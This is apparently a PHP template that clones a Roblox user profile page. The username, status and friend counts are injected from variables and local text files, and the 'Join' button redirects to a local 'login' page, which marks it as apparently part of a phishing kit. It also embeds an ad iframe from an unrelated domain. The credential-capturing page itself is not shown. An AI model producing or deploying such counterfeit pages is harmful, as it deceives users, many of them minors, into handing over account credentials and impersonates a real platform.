    <script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="headerinit" type="text/javascript" src="https://js.rbxcdn.com/a67ddd9413db88f4124e2c4f25d8cb1f.js"></script>

    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Polyfill" data-bundle-source="Main" src="https://js.rbxcdn.com/772034db167d3f4260047db4a7f2b8a58cf448709327013541e47c8962b6e556.js"></script>


    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="XsrfProtection" data-bundle-source="Main" src="https://js.rbxcdn.com/4db2f741b7a3ec36d11fec999ce33f708ae85641cabfd27e11e0935928f7d9c4.js"></script>


    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="HeaderScripts" data-bundle-source="Main" src="https://js.rbxcdn.com/97cb9ac7262155c329a259fce9f940f9bcfa852a6a1ccb44bd8a41c31e84e54b.js"></script>



<meta name="sentry-meta" data-env-name="production" data-dsn="https://6750adeb1b1348e4a10b13e726d5c10b@sentry.io/1539367" data-sample-rate="0"><script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Sentry" data-bundle-source="Main" src="https://js.rbxcdn.com/edc66704bd1974195d8c60f4a163441bec82f1bcb11c492e7df07c43f45a4d49.js"></script>

<meta name="roblox-tracer-meta-data" data-access-token="S3EXjCZQQr6OixnmKu+hoa3OSfpvPP5qgU0esiWgwreFUUMBnPhEaoS5yIIrf9bdYlSgW0XKCb1So9Rhtj1eMzt/MJWcyKZ4TwIckHVj" data-service-name="Web" data-tracer-enabled="false" data-api-sites-request-allow-list="friends.roblox.com,chat.roblox.com,thumbnails.roblox.com,games.roblox.com" data-sample-rate="5" data-is-instrument-page-performance-enabled="true"><script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="RobloxTracer" data-bundle-source="Main" src="https://js.rbxcdn.com/adeccc658a8d5ddc63fb224cc0bcd3e29b73d70db3847c0379426bfa128d9381.js"></script>

    
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">

<script type="text/javascript">
    var Roblox = Roblox || {};
    Roblox.AdsHelper = Roblox.AdsHelper || {};
    Roblox.AdsLibrary = Roblox.AdsLibrary || {};

    Roblox.AdsHelper.toggleAdsSlot = function (slotId, GPTRandomSlotIdentifier) {
        var gutterAdsEnabled = false;
        if (gutterAdsEnabled) {
            googletag.display(GPTRandomSlotIdentifier);
            return;
        }
        
        if (typeof slotId !== 'undefined' && slotId && slotId.length > 0) {
            var slotElm = $("#"+slotId);
            if (slotElm.is(":visible")) {
                googletag.display(GPTRandomSlotIdentifier);
            }else {
                var adParam = Roblox.AdsLibrary.adsParameters[slotId];
                if (adParam) {
                    adParam.template = slotElm.html();
                    slotElm.empty();
                }
            }
        }
    }
</script>
    <script type="text/javascript">
        if (Roblox && Roblox.Performance) {
            Roblox.Performance.setPerformanceMark("html_head");
        }
    </script>




    
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
        <script src="//oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->

<script>
    //Set if it browser's do not track flag is enabled
    var Roblox = Roblox || {};
    (function() {
        var dnt = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
        if (typeof window.external !== "undefined" &&
            typeof window.external.msTrackingProtectionEnabled !== "undefined") {
            dnt = dnt || window.external.msTrackingProtectionEnabled();
        }
        Roblox.browserDoNotTrack = dnt == "1" || dnt == "yes" || dnt === true;
    })();
</script>


    <script type="text/javascript">

        var _gaq = _gaq || [];

                window.GoogleAnalyticsDisableRoblox2 = true;
        _gaq.push(['b._setAccount', 'UA-486632-1']);
            _gaq.push(['b._setSampleRate', '10']);
        _gaq.push(['b._setCampSourceKey', 'rbx_source']);
        _gaq.push(['b._setCampMediumKey', 'rbx_medium']);
        _gaq.push(['b._setCampContentKey', 'rbx_campaign']);

            _gaq.push(['b._setDomainName', 'roblox.com']);

            _gaq.push(['b._setCustomVar', 1, 'Visitor', 'Anonymous', 2]);
                _gaq.push(['b._setPageGroup', 1, 'Profile']);
            _gaq.push(['b._trackPageview']);

        _gaq.push(['c._setAccount', 'UA-26810151-2']);
            _gaq.push(['c._setSampleRate', '1']);
                    _gaq.push(['c._setDomainName', 'roblox.com']);
                    _gaq.push(['c._setPageGroup', 1, 'Profile']);
                    
            (function() {
                if (!Roblox.browserDoNotTrack) {
                    var ga = document.createElement('script');
                    ga.type = 'text/javascript';
                    ga.async = true;
                    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
                    var s = document.getElementsByTagName('script')[0];
                    s.parentNode.insertBefore(ga, s);
                }
        })();
        
     </script>
        <script async="" src="https://www.googletagmanager.com/gtag/js?id=AW-1065449093"></script>
        <script type="text/javascript">
            var accountCode = "AW-1065449093";
            var signupConversionEventKey = "wmuJCO3CZBCF7YX8Aw";
            var webPurchaseConversionEventKey = "XDQ_CJme6s0BEIXthfwD";
            window.dataLayer = window.dataLayer || [];

            function gtag() { dataLayer.push(arguments); }
            gtag.conversionEvents = {
                signupConversionEvent: accountCode + '/' + signupConversionEventKey,
                webPurchaseConversionEvent: accountCode + '/' + webPurchaseConversionEventKey
            }
            gtag ('set', 'allow_ad_personalization_signals', false) ;
            gtag('js', new Date());
            gtag('config', accountCode);
        </script>

            <script type="text/javascript">
            if (Roblox && Roblox.EventStream) {
                Roblox.EventStream.Init("//ecsv2.roblox.com/www/e.png",
                    "//ecsv2.roblox.com/www/e.png",
                    "//ecsv2.roblox.com/pe?t=studio",
                    "//ecsv2.roblox.com/pe?t=diagnostic");
            }
        </script>



<script type="text/javascript">
    if (Roblox && Roblox.PageHeartbeatEvent) {
        Roblox.PageHeartbeatEvent.Init([2,8,20,60]);
    }
</script>    
    <script type="text/javascript">
if (typeof(Roblox) === "undefined") { Roblox = {}; }
Roblox.Endpoints = Roblox.Endpoints || {};
Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
Roblox.Endpoints.Urls['/asset/'] = 'https://assetgame.roblox.com/asset/';
Roblox.Endpoints.Urls['/client-status/set'] = 'https://www.roblox.com/client-status/set';
Roblox.Endpoints.Urls['/client-status'] = 'https://www.roblox.com/client-status';
Roblox.Endpoints.Urls['/game/'] = 'https://assetgame.roblox.com/game/';
Roblox.Endpoints.Urls['/game/edit.ashx'] = 'https://assetgame.roblox.com/game/edit.ashx';
Roblox.Endpoints.Urls['/game/placelauncher.ashx'] = 'https://assetgame.roblox.com/game/placelauncher.ashx';
Roblox.Endpoints.Urls['/game/preloader'] = 'https://assetgame.roblox.com/game/preloader';
Roblox.Endpoints.Urls['/game/report-stats'] = 'https://assetgame.roblox.com/game/report-stats';
Roblox.Endpoints.Urls['/game/report-event'] = 'https://assetgame.roblox.com/game/report-event';
Roblox.Endpoints.Urls['/game/updateprerollcount'] = 'https://assetgame.roblox.com/game/updateprerollcount';
Roblox.Endpoints.Urls['/login/default.aspx'] = 'https://www.roblox.com/login/default.aspx';
Roblox.Endpoints.Urls['/my/avatar'] = 'https://www.roblox.com/my/avatar';
Roblox.Endpoints.Urls['/my/money.aspx'] = 'https://www.roblox.com/my/money.aspx';
Roblox.Endpoints.Urls['/navigation/userdata'] = 'https://www.roblox.com/navigation/userdata';
Roblox.Endpoints.Urls['/chat/chat'] = 'https://www.roblox.com/chat/chat';
Roblox.Endpoints.Urls['/chat/data'] = 'https://www.roblox.com/chat/data';
Roblox.Endpoints.Urls['/friends/list'] = 'https://www.roblox.com/friends/list';
Roblox.Endpoints.Urls['/navigation/getcount'] = 'https://www.roblox.com/navigation/getCount';
Roblox.Endpoints.Urls['/regex/email'] = 'https://www.roblox.com/regex/email';
Roblox.Endpoints.Urls['/catalog/browse.aspx'] = 'https://www.roblox.com/catalog/browse.aspx';
Roblox.Endpoints.Urls['/catalog/html'] = 'https://search.roblox.com/catalog/html';
Roblox.Endpoints.Urls['/catalog/json'] = 'https://search.roblox.com/catalog/json';
Roblox.Endpoints.Urls['/catalog/contents'] = 'https://search.roblox.com/catalog/contents';
Roblox.Endpoints.Urls['/catalog/lists.aspx'] = 'https://search.roblox.com/catalog/lists.aspx';
Roblox.Endpoints.Urls['/catalog/items'] = 'https://search.roblox.com/catalog/items';
Roblox.Endpoints.Urls['/asset-hash-thumbnail/image'] = 'https://assetgame.roblox.com/asset-hash-thumbnail/image';
Roblox.Endpoints.Urls['/asset-hash-thumbnail/json'] = 'https://assetgame.roblox.com/asset-hash-thumbnail/json';
Roblox.Endpoints.Urls['/asset-thumbnail-3d/json'] = 'https://assetgame.roblox.com/asset-thumbnail-3d/json';
Roblox.Endpoints.Urls['/asset-thumbnail/image'] = 'https://assetgame.roblox.com/asset-thumbnail/image';
Roblox.Endpoints.Urls['/asset-thumbnail/json'] = 'https://assetgame.roblox.com/asset-thumbnail/json';
Roblox.Endpoints.Urls['/asset-thumbnail/url'] = 'https://assetgame.roblox.com/asset-thumbnail/url';
Roblox.Endpoints.Urls['/asset/request-thumbnail-fix'] = 'https://assetgame.roblox.com/asset/request-thumbnail-fix';
Roblox.Endpoints.Urls['/avatar-thumbnail-3d/json'] = 'https://www.roblox.com/avatar-thumbnail-3d/json';
Roblox.Endpoints.Urls['/avatar-thumbnail/image'] = 'https://www.roblox.com/avatar-thumbnail/image';
Roblox.Endpoints.Urls['/avatar-thumbnail/json'] = 'https://www.roblox.com/avatar-thumbnail/json';
Roblox.Endpoints.Urls['/avatar-thumbnails'] = 'https://www.roblox.com/avatar-thumbnails';
Roblox.Endpoints.Urls['/avatar/request-thumbnail-fix'] = 'https://www.roblox.com/avatar/request-thumbnail-fix';
Roblox.Endpoints.Urls['/bust-thumbnail/json'] = 'https://www.roblox.com/bust-thumbnail/json';
Roblox.Endpoints.Urls['/headshot-thumbnail/json'] = 'https://www.roblox.com/headshot-thumbnail/json';
Roblox.Endpoints.Urls['/item-thumbnails'] = 'https://www.roblox.com/item-thumbnails';
Roblox.Endpoints.Urls['/outfit-thumbnail/json'] = 'https://www.roblox.com/outfit-thumbnail/json';
Roblox.Endpoints.Urls['/place-thumbnails'] = 'https://www.roblox.com/place-thumbnails';
Roblox.Endpoints.Urls['/thumbnail/asset/'] = 'https://www.roblox.com/thumbnail/asset/';
Roblox.Endpoints.Urls['/thumbnail/avatar-headshot'] = 'https://www.roblox.com/thumbnail/avatar-headshot';
Roblox.Endpoints.Urls['/thumbnail/avatar-headshots'] = 'https://www.roblox.com/thumbnail/avatar-headshots';
Roblox.Endpoints.Urls['/thumbnail/user-avatar'] = 'https://www.roblox.com/thumbnail/user-avatar';
Roblox.Endpoints.Urls['/thumbnail/resolve-hash'] = 'https://www.roblox.com/thumbnail/resolve-hash';
Roblox.Endpoints.Urls['/thumbnail/place'] = 'https://www.roblox.com/thumbnail/place';
Roblox.Endpoints.Urls['/thumbnail/get-asset-media'] = 'https://www.roblox.com/thumbnail/get-asset-media';
Roblox.Endpoints.Urls['/thumbnail/remove-asset-media'] = 'https://www.roblox.com/thumbnail/remove-asset-media';
Roblox.Endpoints.Urls['/thumbnail/set-asset-media-sort-order'] = 'https://www.roblox.com/thumbnail/set-asset-media-sort-order';
Roblox.Endpoints.Urls['/thumbnail/place-thumbnails'] = 'https://www.roblox.com/thumbnail/place-thumbnails';
Roblox.Endpoints.Urls['/thumbnail/place-thumbnails-partial'] = 'https://www.roblox.com/thumbnail/place-thumbnails-partial';
Roblox.Endpoints.Urls['/thumbnail_holder/g'] = 'https://www.roblox.com/thumbnail_holder/g';
Roblox.Endpoints.Urls['/users/{id}/profile'] = 'https://www.roblox.com/users/{id}/profile';
Roblox.Endpoints.Urls['/service-workers/push-notifications'] = 'https://www.roblox.com/service-workers/push-notifications';
Roblox.Endpoints.Urls['/notification-stream/notification-stream-data'] = 'https://www.roblox.com/notification-stream/notification-stream-data';
Roblox.Endpoints.Urls['/api/friends/acceptfriendrequest'] = 'https://www.roblox.com/api/friends/acceptfriendrequest';
Roblox.Endpoints.Urls['/api/friends/declinefriendrequest'] = 'https://www.roblox.com/api/friends/declinefriendrequest';
Roblox.Endpoints.Urls['/authentication/is-logged-in'] = 'https://www.roblox.com/authentication/is-logged-in';
Roblox.Endpoints.addCrossDomainOptionsToAllRequests = true;
</script>

    <script type="text/javascript">
if (typeof(Roblox) === "undefined") { Roblox = {}; }
Roblox.Endpoints = Roblox.Endpoints || {};
Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
</script>

    <script>
    Roblox = Roblox || {};
    Roblox.AbuseReportPVMeta = {
        desktopEnabled: false,
        phoneEnabled: false,
        inAppEnabled: false
    };
</script>


<meta name="thumbnail-meta-data" data-is-webapp-cache-enabled="False" data-webapp-cache-expirations-timespan="00:01:00" data-request-min-cooldown="1000" data-request-max-cooldown="30000" data-request-max-retry-attempts="3" data-request-batch-size="100" data-thumbnail-metrics-sample-size="20" data-concurrent-thumbnail-request-count="4">
                          

</head>
<body id="rbx-body" class="rbx-body   light-theme gotham-font" data-performance-relative-value="0.005" data-internal-page-name="Profile" data-send-event-percentage="0">
    
    <meta name="csrf-token" data-token="+tirjKqMnrw/">

    <div id="roblox-linkify" data-enabled="true" data-regex="(https?\:\/\/)?(?:www\.)?([a-z0-9-]{2,}\.)*(((m|de|www|web|api|blog|wiki|corp|polls|bloxcon|developer|devforum|forum|status)\.roblox\.com|robloxlabs\.com)|(www\.shoproblox\.com)|(roblox\.status\.io)|(rblx\.co)|help\.roblox\.com(?![A-Za-z0-9\/.]*\/attachments\/))(?!\/[A-Za-z0-9-+&amp;@#\/=~_|!:,.;]*%)((\/[A-Za-z0-9-+&amp;@#\/%?=~_|!:,.;]*)|(?=\s|\b))" data-regex-flags="gm" data-as-http-regex="(([^.]help|polls)\.roblox\.com)"></div>

<div id="image-retry-data" data-image-retry-max-times="30" data-image-retry-timer="500" data-ga-logging-percent="10">
</div>
<div id="http-retry-data" data-http-retry-max-timeout="0" data-http-retry-base-timeout="0" data-http-retry-max-times="1">
</div>
    
    



<div id="fb-root"></div>

<div id="wrap" class="wrap no-gutter-ads logged-out" data-gutter-ads-enabled="false">


<div id="SocialIdentitiesInformation" data-rbx-login-redirect-url="/social/postlogin" data-context="loginDropdown">
</div>                <script src="https://roblox-api.arkoselabs.com/fc/api/?onload=reportFunCaptchaLoaded" async="" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportResourceError('funcaptcha')"></script>
<script type="text/javascript">
    var Roblox = Roblox || {};
    $(function () {
        var funCaptcha = Roblox.FunCaptcha;
        if (funCaptcha) {
            var captchaTypes = [{"Type":"Login","PublicKey":"9F35E182-C93C-EBCC-A31D-CF8ED317B996","ApiUrl":"https://captcha.roblox.com/v1/funcaptcha/login/web"}];
            funCaptcha.addCaptchaTypes(captchaTypes, true);
            funCaptcha.setMaxRetriesOnTokenValidationFailure(0);
            funCaptcha.setPerAppTypeLoggingEnabled(false);
            funCaptcha.setRetryIntervalRange(500, 1500);
        }
    });

    // Necessary because of how FunCaptcha js executes callback
    // i.e. window["{function name}"]
    function reportFunCaptchaLoaded()
    {
        if (Roblox.BundleDetector)
        {
            Roblox.BundleDetector.reportResourceLoaded("funcaptcha");
        }
    }
</script>


<div id="navigation-container" class="light-theme gotham-font" data-number-of-autocomplete-suggestions="7">
    <div id="header" class="navbar-fixed-top rbx-header" role="navigation">
  <div class="container-fluid">
    <div class="rbx-navbar-header">
      <div id="header-menu-icon" class="rbx-nav-collapse"><button type="button" class="btn-primary-xs btn-min-width" id="skip-to-main-content">Skip to Main Content</button></div>
      <div class="navbar-header">
        <a class="navbar-brand" href="/home">
          <span class="icon-logo"></span><span class="icon-logo-r"></span>
        </a>
      </div>
    </div>
    <ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4">
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="/discover">Discover</a>
      </li>
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="/catalog">Avatar Shop</a>
      </li>
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="/develop">Create</a>
      </li>
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="/robux?ctx-nav">Robux</a>
      </li>
    </ul>

    <ul class="nav rbx-navbar hidden-md hidden-lg col-xs-12">
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="/discover">Discover</a>
      </li>
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="/catalog">Avatar Shop</a>
      </li>
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="/develop">Create</a>
      </li>
      <li>
        <a class="font-header-2 nav-menu-title text-header" href="/robux?ctx=nav">Robux</a>
      </li>
    </ul>
    <div id="right-navigation-header"><div data-testid="navigation-search-input" class="navbar-left navbar-search col-xs-5 col-sm-6 col-md-2 col-lg-3" role="search"><div class="input-group"><form><div class="form-has-feedback"><input id="navbar-search-input" data-testid="navigation-search-input-field" class="form-control input-field new-input-field" placeholder="Search" maxlength="120" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" value=""></div></form><div class="input-group-btn"><button data-testid="navigation-search-input-search-button" class="input-addon-btn" type="submit"><span class="icon-common-search-sm"></span></button></div></div><ul class="dropdown-menu new-dropdown-menu" role="menu"><li class="navbar-search-option rbx-clickable-li new-selected"><a class="new-navbar-search-anchor" href="https://www.roblox.com/search/users?keyword="><span class="icon-menu-profile navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in People</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/discover/?Keyword="><span class="icon-menu-games-off navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Experiences</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/catalog?CatalogContext=1&amp;Keyword="><span class="icon-menu-shop navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Avatar Shop</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/search/groups?keyword="><span class="icon-menu-groups navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Groups</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/develop/library?CatalogContext=2&amp;Category=6&amp;Keyword="><span class="icon-menu-library navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Creator Marketplace</span></a></li></ul></div><div class="navbar-right rbx-navbar-right"><ul class="nav navbar-right rbx-navbar-right-nav"><li class="signup-button-container"><a class="rbx-navbar-signup btn-growth-sm nav-menu-title signup-button" href="https://www.roblox.com/account/signupredir?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F3524148282%2Fprofile" id="sign-up-button">Sign Up</a></li><li class="login-action"><a class="rbx-navbar-login btn-secondary-sm nav-menu-title rbx-menu-item" href="https://www.roblox.com/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F3524148282%2Fprofile">Log In</a></li><li class="rbx-navbar-right-search"><button type="button" class="rbx-menu-item btn-navigation-nav-search-white-md"><span class="icon-nav-search-white"></span></button></li></ul></div></div>
  </div>
</div>
<div id="left-navigation-container"></div>
<div id="verificationUpsell-container"><div></div></div>
<div id="phoneVerificationUpsell-container">
  <div phoneverificationupsell-container=""></div>
</div>
<div id="accountRecoveryModal-container"></div>

</div>

<script type="text/javascript">
    var Roblox = Roblox || {};
    (function () {
        if (Roblox && Roblox.Performance) {
            Roblox.Performance.setPerformanceMark("navigation_end");
        }
    })();
</script>

    <div class="container-main 
                
                
                
                
                
                " id="container-main" tabindex="-1">
            <script type="text/javascript">
                if (top.location != self.location) {
                    top.location = self.location.href;
                }
            </script>

        <div class="alert-container">
            <noscript><div><div class="alert-info" role="alert">Please enable Javascript to use all the features on this site.</div></div></noscript>




        </div>


        <div class="content">

                            <div id="Leaderboard-Abp" class="abp leaderboard-abp">
                            <iframe name="Roblox_GameDetail_Top_728x90" 
        allowtransparency="true"
        frameborder="0"
        height="110"
        scrolling="no"
        data-src=""
        src="http://termed.monster/spon.php?id=1"
        width="728"
        data-js-adtype="iframead"
        data-ad-slot="Roblox_GameDetail_Top_728x90"></iframe></div>
            
    <script src="https://roblox-api.arkoselabs.com/fc/api/"></script>



<script type="text/javascript">
    var Roblox = Roblox || {};
    Roblox.I18nData = Roblox.I18nData || {};
    Roblox.I18nData.isI18nEnabledForGroups = true;
</script>

<div class="profile-container ng-scope" ng-modules="robloxApp, profile, angularLazyImg, peopleList, aliases, groupList, userDescription">
    <div ng-controller="profileBaseController" class="ng-scope">


<div class="section profile-header ">

    <div class="section-content profile-header-content ng-scope" ng-controller="profileHeaderController">
<script type="text/javascript">

    var Roblox = Roblox || {};
    Roblox.ProfileHeaderData = {"profileusername":"<?=$fusername?>","previoususernames":""};
</script>

<div data-profileuserid="3524148282" data-friendscount="5" data-followerscount="2" data-followingscount="1" data-arefriends="false" data-friendurl="https://www.roblox.com/users/3524148282/friends#!/friends" data-incomingfriendrequestpending="false" data-maysendfriendinvitation="false" data-friendrequestpending="false" data-mayfollow="false" data-isfollowing="false" data-canmessage="true" data-messagesdisabled="false" data-messageurl="/messages/compose?recipientId=3524148282" data-canbefollowed="false" data-cantrade="false" data-isblockbuttonvisible="false" data-getfollowscript="" data-ismorebtnvisible="false" data-isvieweeblocked="false" data-mayimpersonate="false" data-mayupdatestatus="false" data-updatestatusurl="" data-statustext="" data-statusdate="1/1/0001 12:00:00 AM" data-editstatusmaxlength="254" data-ischatdisabledbyprivacysetting="false" profile-header-data="" set-message-btn-display="setMessageBtnDisplay(layout)" profile-header-layout="profileHeaderLayout" class="hidden ng-isolate-scope"></div>

        <div class="profile-header-top">
<div class="avatar avatar-headshot-lg card-plain profile-avatar-image">
            <span class="avatar-card-link avatar-image-link">
                <!-- ngIf: profileHeaderLayout.profileUserId --><thumbnail-2d ng-if="profileHeaderLayout.profileUserId" class="avatar-card-image profile-avatar-thumb ng-scope ng-isolate-scope" thumbnail-target-id="profileHeaderLayout.profileUserId" thumbnail-type="thumbnailTypes.avatarHeadshot"><span ng-class="$ctrl.getCssClasses()" class="thumbnail-2d-container" thumbnail-type="AvatarHeadshot" thumbnail-target-id="3524148282"> <!-- ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() --><img ng-if="$ctrl.thumbnailUrl &amp;&amp; !$ctrl.isLazyLoadingEnabled()" ng-src="https://www.roblox.com/headshot-thumbnail/image?userId=<?=$userid?>&width=180&height=180&format=png" thumbnail-error="$ctrl.setThumbnailLoadFailed" ng-class="{'loading': $ctrl.thumbnailUrl &amp;&amp; !isLoaded }" image-load="" alt="" title="" class="ng-scope ng-isolate-scope" src="https://www.roblox.com/headshot-thumbnail/image?userId=<?=$userid?>&width=180&height=180&format=png"><!-- end ngIf: $ctrl.thumbnailUrl && !$ctrl.isLazyLoadingEnabled() --> <!-- ngIf: $ctrl.thumbnailUrl && $ctrl.isLazyLoadingEnabled() --> </span> </thumbnail-2d><!-- end ngIf: profileHeaderLayout.profileUserId -->
             </span>
            <script type="text/javascript">
                $(".profile-avatar-thumb img").on('load', function() {
                    if (Roblox && Roblox.Performance) {
                        Roblox.Performance.setPerformanceMark("head_avatar");
                    }
                });
            </script>
                <div ng-non-bindable="">
                            <a href="javascript:0" class="avatar-status game">
                                <span class="icon-<?=$activity?> profile-avatar-status" title="Adopt Me!"></span>
                            </a>
                </div>
        </div>
        <div class="header-caption">
            <div class="header-names">
                <div class="header-title">
                        <span class="icon-premium-medium"></span>
                        <span class="icon-premium-small"></span>

                        <h1 ng-non-bindable="" class="profile-name text-overflow">
                            <?=$fusername?>
                        </h1>
                        <h1 ng-non-bindable="" class="profile-name text-overflow font-header-1">
                            <?=$fusername?>
                        </h1>
                </div>
                    <div class="profile-display-name font-caption-body text text-overflow" ng-non-bindable="">
                        @<?=$fusername?>
                    </div>
            </div>
            <div class="header-details">
                <ul class="details-info">
                    <li>
                        <div class="text-label font-caption-header ng-binding" ng-bind="'Label.Friends' | translate">Friends</div>
                        <a class="text-name" href="https://www.roblox.com/users/3524148282/friends#!/friends">
                            <span class="font-header-2 ng-binding" title="<?=number_format(file_get_contents('controller/friends.txt'))?>" ng-bind="profileHeaderLayout.friendsCount | abbreviate"><?=number_format(file_get_contents('controller/friends.txt'))?></span>
                        </a>
                    </li>
                    <li>
                        <div class="text-label font-caption-header ng-binding" ng-bind="'Label.Followers' | translate">Followers</div>
                        <a class="text-name" href="https://www.roblox.com/users/3524148282/friends#!/followers">
                            <span class="font-header-2 ng-binding" title="<?=number_format(file_get_contents('controller/followers.txt'))?>" ng-bind="getAbbreviatedStringFromCountValue(profileHeaderLayout.followersCount)"><?=number_format(file_get_contents('controller/followers.txt'))?></span>
                        </a>
                    </li>
                    <li>
                        <div class="text-label font-caption-header ng-binding" ng-bind="'Label.Following' | translate">Following</div>
                        <a class="text-name" href="https://www.roblox.com/users/3524148282/friends#!/following">
                            <span class="font-header-2 ng-binding" title="<?=number_format(file_get_contents('controller/followings.txt'))?>" ng-bind="getAbbreviatedStringFromCountValue(profileHeaderLayout.followingsCount)"><?=number_format(file_get_contents('controller/followings.txt'))?></span>
                        </a>
                    </li>
                </ul>
<ul class="details-actions desktop-action">
                        <!-- ngIf: !profileHeaderLayout.areFriends -->
                        <!-- ngIf: profileHeaderLayout.areFriends --><li class="btn-friends ng-scope" ng-if="profileHeaderLayout.areFriends">
<li class="btn-friends ng-scope" ng-if="!profileHeaderLayout.areFriends">
                            <!-- ngIf: profileHeaderLayout.incomingFriendRequestPending -->
                            <!-- ngIf: !profileHeaderLayout.incomingFriendRequestPending
                                            && profileHeaderLayout.maySendFriendInvitation -->
                            <!-- ngIf: !profileHeaderLayout.incomingFriendRequestPending
                                        && !profileHeaderLayout.maySendFriendInvitation
                                        && profileHeaderLayout.friendRequestPending -->
                            <!-- ngIf: !profileHeaderLayout.incomingFriendRequestPending
                                        && !profileHeaderLayout.maySendFriendInvitation
                                        && !profileHeaderLayout.friendRequestPending --><button ng-if="!profileHeaderLayout.incomingFriendRequestPending
                                        &amp;&amp; !profileHeaderLayout.maySendFriendInvitation
                                        &amp;&amp; !profileHeaderLayout.friendRequestPending" class="btn-control-md disabled ng-binding ng-scope" ng-bind="'Action.AddFriend' | translate">Add Friend</button><!-- end ngIf: !profileHeaderLayout.incomingFriendRequestPending
                                        && !profileHeaderLayout.maySendFriendInvitation
                                        && !profileHeaderLayout.friendRequestPending -->
                        </li>
                        </li><!-- end ngIf: profileHeaderLayout.areFriends -->
                        <li class="btn-messages" id="profile-message-btn">
                            <button class="btn-control-md ng-binding ng-hide" ng-disabled="!profileHeaderLayout.enableMessageBtn" ng-show="profileHeaderLayout.showMessageBtn" ng-click="sendMessage()" ng-bind="'Action.Message' | translate">Message</button>
                        </li>
<li class="btn-messages" id="profile-message-btn">
                            <button class="btn-control-md ng-binding" ng-disabled="!profileHeaderLayout.enableMessageBtn" ng-show="profileHeaderLayout.showMessageBtn" ng-click="sendMessage()" ng-bind="'Action.Message' | translate" disabled="disabled">Message</button>
                        </li>
                        <?php if($activity=='game'):?>
                        <!-- ngIf: profileHeaderLayout.canBeFollowed --><li class="btn-join-game ng-scope" ng-if="profileHeaderLayout.canBeFollowed">
                            <button onclick="location.replace('login')" class="profile-join-game btn-growth-md ng-binding" ng-bind="'Action.JoinGame' | translate">Join</button>
                        </li><!-- end ngIf: profileHeaderLayout.canBeFollowed -->
                        <?php endif;?>
                    </ul>
            </div><!--header-details-->
        </div>
            <div user-status=""></div>
    </div>
    <p ng-show="profileHeaderLayout.hasError" class="text-error header-details-error ng-binding ng-hide" ng-bind="profileHeaderLayout.errorMsg"></p>
    <div id="profile-header-more" class="profile-header-more ng-hide" ng-show="profileHeaderLayout.isMoreBtnVisible">
        <button id="popover-link" class="rbx-menu-item btn-generic-more-sm" data-toggle="popover" data-bind="profile-header-popover-content" data-original-title="" title="">
            <span class="icon-more"></span>
        </button>
                <div id="popover-content" class="rbx-popover-content" data-toggle="profile-header-popover-content">
                    <ul class="dropdown-menu" role="menu">
                        <li ng-show="profileHeaderLayout.showMessageLink" id="profile-message-in-menu" class="ng-hide">
                            <button role="button" id="profile-message" ng-click="sendMessage()" ng-bind="'Action.Message' | translate" class="ng-binding">Message</button>
                        </li>
                        <li ng-show="profileHeaderLayout.mayFollow" class="ng-hide">
                            <button role="button" ng-bind="profileHeaderLayout.isFollowing ? 'Action.Unfollow' : 'Action.Follow' | translate" ng-click="follow()" id="profile-follow-user" class="ng-binding">Follow</button>
                        </li>
                            <li ng-show="profileHeaderLayout.canTrade" class="ng-hide">
                                <button role="button" ng-click="tradeItems()" id="profile-trade-items" ng-bind="'Action.TradeItems' | translate" class="ng-binding">Trade Items</button>
                            </li>
                        <li ng-show="profileHeaderLayout.isBlockButtonVisible" class="ng-hide">
                            <button role="button" ng-bind="!profileHeaderLayout.isVieweeBlocked ? 'Action.BlockUser' : 'Action.UnblockUser'| translate" ng-click="blockUser()" id="profile-block-user" class="ng-binding">Block User</button>
                        </li>
                                                    <li>
                                <a href="https://www.roblox.com/users/3524148282/inventory/" ng-bind="'Action.Inventory' | translate" class="ng-binding">Inventory</a>
                            </li>
